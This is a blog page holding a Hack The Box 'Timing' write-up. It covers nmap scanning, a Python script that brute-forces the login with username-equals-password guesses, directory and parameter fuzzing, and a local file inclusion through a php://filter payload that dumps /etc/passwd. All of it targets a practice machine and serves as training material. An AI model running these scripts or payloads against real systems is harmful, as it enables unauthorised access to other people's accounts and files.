<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="HTB Timing Writeup" />
<meta name="author" content="Iven" />
<meta property="og:locale" content="en" />
<meta name="description" content="INFO Machine IP = 10.10.11.135 OS = Linux Level = MEDIUM Points = 30" />
<meta property="og:description" content="INFO Machine IP = 10.10.11.135 OS = Linux Level = MEDIUM Points = 30" />
<link rel="canonical" href="https://iven86.github.io/posts/Timing/" />
<meta property="og:url" content="https://iven86.github.io/posts/Timing/" />
<meta property="og:site_name" content="Iven Blog" />
<meta property="og:image" content="https://iven86.github.io/../../assets/img/medium/Timing.png" />
<meta property="og:image:height" content="150" />
<meta property="og:image:width" content="150" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-03-18T17:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://iven86.github.io/../../assets/img/medium/Timing.png" />
<meta property="twitter:title" content="HTB Timing Writeup" />
<meta name="twitter:site" content="@iven86" />
<meta name="twitter:creator" content="@Iven" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Iven"},"dateModified":"2025-04-03T10:26:13+02:00","datePublished":"2022-03-18T17:00:00+01:00","description":"INFO Machine IP = 10.10.11.135 OS = Linux Level = MEDIUM Points = 30","headline":"HTB Timing Writeup","image":{"width":150,"height":150,"url":"https://iven86.github.io/../../assets/img/medium/Timing.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://iven86.github.io/posts/Timing/"},"url":"https://iven86.github.io/posts/Timing/"}</script>
<!-- End Jekyll SEO tag -->


  <title>HTB Timing Writeup | Iven Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Iven Blog">
<meta name="application-name" content="Iven Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    <script defer src=""></script>
  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js,npm/mermaid@10.6.0/dist/mermaid.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script async src="/assets/js/data/mathjax.js"></script>
  <script async src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"></script>


<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/../assets/img/images/threat-icon-9.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">Iven Blog</a>
    <p class="site-subtitle fst-italic mb-0">DevOps - Penetration Tester - CTF Writeups.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tag"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/donation/" class="nav-link">
            <i class="fa-fw fas fa-hand-holding-usd"></i>
            

            <span>DONATION</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/HTB-Writeup/" class="nav-link">
            <i class="fa-fw fas fa-box"></i>
            

            <span>HTB-WRITEUP</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/PortSwigger/" class="nav-link">
            <i class="fa-fw fas fa-box"></i>
            

            <span>PORTSWIGGER</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/privacy_policy/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>PRIVACY POLICY</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/iven86"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/iven86"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['ivenprvb','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>HTB Timing Writeup</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- add class to exist <a> tag -->
        
        
        

      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>HTB Timing Writeup</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1647619200"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Mar 18, 2022
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1743668773"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Apr  3, 2025
</time>

        </span>
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/../../assets/img/medium/Timing.png" class="popup img-link preview-img shimmer"><img src="/../../assets/img/medium/Timing.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                
                </em>, <em>
              
                
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3279 words"
>
  <em>18 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">HTB Timing Writeup</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">HTB Timing Writeup</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  
  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4238679248235087"
     crossorigin="anonymous"></script>
<!-- Iven's blog ads -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-4238679248235087"
     data-ad-slot="1267169343"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
  <div class="content">
    <h2 id="info"><span class="me-2">INFO</span><a href="#info" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Machine IP = 10.10.11.135<br />
OS       = Linux<br />
Level    = MEDIUM<br />
Points   = 30<br /></p>

<p>Write the IP of the machine to your /etc/hosts file</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>echo "x.x.x.x xxx.htb" &gt;&gt; /etc/hosts
</pre></td></tr></tbody></table></code></div></div>

<h2 id="scanning"><span class="me-2">SCANNING</span><a href="#scanning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<h3 id="--nmap"><span class="me-2">- Nmap:</span><a href="#--nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sC -sV -oA nmap/timing/result 10.10.11.135
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 14:43 EDT
Nmap scan report for 10.10.11.135
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)                                                                         
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)                                                                       
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                                                                     
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                            
| http-title: Simple WebApp                                                                                                             
|_Requested resource was ./login.php                                                                                                    
| http-cookie-flags:                                                                                                                    
|   /:                                                                                                                                  
|     PHPSESSID:                                                                                                                        
|_      httponly flag not set                                                                                                           
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                 
                                                                                                                                        
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                          
Nmap done: 1 IP address (1 host up) scanned in 32.42 seconds 
</pre></td></tr></tbody></table></code></div></div>

<h2 id="enumeration"><span class="me-2">ENUMERATION</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="--ports"><span class="me-2">- Ports:</span><a href="#--ports" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http          Apache httpd 2.4.29 ((Ubuntu))
</pre></td></tr></tbody></table></code></div></div>
<h4 id="port-80"><span class="me-2">Port: 80</span><a href="#port-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>A simple login page there’s a two scenario by brute-forcing this login page or pass this step with the next one but let’s play around brute-forcing login page through writing a python script.</p>

<p>This script do attack by username same as password</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre># ========================== #
url = 'http://10.10.11.135/login.php?login=true'
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'}
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# Get users and passwords
UPL = open("/usr/share/wordlists/rockyou.txt", "r") # UserName and PassWord list
payload = {
    'user':'',
    'password':''
    }
for username in UPL:
    sleep(3)
    counter_value += 1
    # print(counter_value, '-&gt;', payload, end='\r')
    payload['user'] = username.strip('\n')
    payload['password'] = username.strip('\n')
    response = requests.request("POST", url, headers=headers, data=payload, verify=False)
    if not response.cookies:
        print(payload)
        break
    else:
        print(counter_value, end='\r')
# ========================== #
</pre></td></tr></tbody></table></code></div></div>
<p>And after waiting we got UserName and PassWord (‘aa<strong><em>’, ‘aa</em></strong>’) (&gt;‿◠)</p>

<p>This line if you want to use proxy</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre># response = requests.request("POST", url, headers=headers, data=payload, proxies=proxies, verify=False)
</pre></td></tr></tbody></table></code></div></div>
<p>Or we can do same thing with Burp suite through send request to intruder then add positions, payloads and start attack.</p>

<p>But let’s try another thing.</p>

<h3 id="--gobuster"><span class="me-2">- Gobuster:</span><a href="#--gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Before we start with Gobuster let’s do it in our way by writing our special script :)</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre># ========================== #
from requests_toolbelt import threaded
# dir_list = open("/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", "r")
dir_list = open("/home/kali/Desktop/time/dirlist", "r")
url = 'http://10.10.11.135/'

for d in dir_list:
    sleep(2)
    counter_value += 1
    d = d.strip('\n')
    host = [{
        'url': url + d,
        'method': 'GET',
    }]
    responses, errors = threaded.map(host)

    for response in responses:
        if response.response.status_code != 404:
            print(host[0]['url'], response.response.status_code, response.response.url)
# ========================== #
</pre></td></tr></tbody></table></code></div></div>
<p>And we got these results:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>http://10.10.11.135/footer.php 200 http://10.10.11.135/footer.php
http://10.10.11.135/upload.php 200 http://10.10.11.135/login.php
http://10.10.11.135/css 403 http://10.10.11.135/css/
http://10.10.11.135/js 403 http://10.10.11.135/js/
http://10.10.11.135/logout.php 200 http://10.10.11.135/login.php
http://10.10.11.135/login.php 200 http://10.10.11.135/login.php
http://10.10.11.135/profile.php 200 http://10.10.11.135/login.php
http://10.10.11.135/image.php 200 http://10.10.11.135/image.php
http://10.10.11.135/header.php 200 http://10.10.11.135/login.php
http://10.10.11.135/images 403 http://10.10.11.135/images/
  ...

</pre></td></tr></tbody></table></code></div></div>
<p>Hmm, all pages took as to login.php except [image.php, images] before continuing let’s do Gobuster.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>gobuster dir -u http://10.10.11.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x php  -o gobuster.log

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.135/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/03/19 13:00:51 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--&gt; ./login.php]
/login.php            (Status: 200) [Size: 5609]               
/images               (Status: 301) [Size: 313] [--&gt; http://10.10.11.135/images/]
/image.php            (Status: 200) [Size: 0]                                    
/header.php           (Status: 302) [Size: 0] [--&gt; ./login.php]                  
/profile.php          (Status: 302) [Size: 0] [--&gt; ./login.php]                  
/footer.php           (Status: 200) [Size: 3937]                                 
/upload.php           (Status: 302) [Size: 0] [--&gt; ./login.php]                  
/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.135/css/]   
/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.135/js/]    
/logout.php           (Status: 302) [Size: 0] [--&gt; ./login.php] 
  ...
</pre></td></tr></tbody></table></code></div></div>

<p>And we came up with the same results with our preview python script.</p>

<p>But the image.php don’t give any error or redirect. I think this page accept some parameters like GET or POST.</p>

<p>Let’s find the parameters with wfuzz or maybe write our script too :).</p>

<h3 id="--wfuzz"><span class="me-2">- wfuzz:</span><a href="#--wfuzz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>wfuzz -u http://10.10.11.135/image.php?FUZZ=/etc/passwd -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -t 50 --hh 0
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.135/image.php?FUZZ=/etc/passwd
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================

000000360:   200        0 L      3 W        25 Ch       "img"                                                                                     

Total time: 20.44444
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 126.5869

</pre></td></tr></tbody></table></code></div></div>
<p>So we see here the only parameter is [img] let’s check if it vulnerable with [LFI].</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>curl http://10.10.11.135/image.php?img=/etc/passwd
Hacking attempt detected! 
</pre></td></tr></tbody></table></code></div></div>
<p>And it’s said hacking attempt detected!, Nice</p>

<p>Let’s try with PHP base64 filter to check the results if it’s the same or not.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre>curl http://10.10.11.135/image.php?img=php://filter/convert.base64-decoder/resource=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
                                              
</pre></td></tr></tbody></table></code></div></div>
<p>and Bingo! we got the passwd file content</p>

